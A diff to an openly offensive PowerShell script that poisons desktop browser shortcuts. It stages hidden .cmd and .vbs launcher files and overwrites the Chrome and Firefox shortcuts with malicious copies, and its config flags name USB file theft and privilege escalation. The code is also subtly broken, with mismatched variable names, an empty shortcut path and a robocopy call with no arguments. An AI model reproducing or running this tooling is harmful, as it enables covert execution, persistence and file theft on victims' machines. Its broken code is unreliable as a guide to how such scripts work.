@@ -3,7 +3,8 @@
 # Config Section, configure options with 'yes' or 'no':
 
 # Shortcut Section:
-$invisile_shell_launcher='yes'
+# Note $invisible_shell_launcher must be set to 'yes' for any of the other commands in the Shortcut section to run!!!
+$invisible_shell_launcher='yes'
 $poison_shortcuts='yes'
 $shortcut_privesc='no'
 
@@ -51,13 +52,22 @@ If ($steal_files_usb -eq 'yes') {
 
 # Real shortcut section
 
-If (Test-Path "$Env:UserProfile\Desktop\Google Chrome.lnk" -eq True) {
+If ($invisible_shell_launcher -eq 'yes') {
+  $poison_file_a="$PSScriptRoot\f o.cmd"
+  $poison_file_i="$PSScriptRoot\i.vbs"
+  $poison_file_c="$PSScriptRoot\z.cmd"
+  mkdir "$Env:UserProfile\temp\"
+
+  robocopy /S /MT /Z
+}
+
+If (Test-Path "$Env:UserProfile\Desktop\Google Chrome.lnk" -eq True  -AND $invisile_shell_launcher -eq 'yes') {
   $chrome_lnk="$Env:UserProfile\Desktop\Google Chrome.lnk"
   $poisoned_chrome="$PSScriptRoot\Google Chrome.lnk"
   robocopy $poison_chrome $chrome_lnk /S /MT /Z
 }
 
-If (Test-Path "$Env:UserProfile\Desktop\Firefox.lnk" -eq True) {
+If (Test-Path "$Env:UserProfile\Desktop\Firefox.lnk" -eq True  -AND $invisile_shell_launcher -eq 'yes') {
   $firefox_lnk=""
   $poisoned_firefox="$PSScriptRoot\Firefox.lnk"
   robocopy $poisoned_firefox $firefox_lnk /S /MT /Z
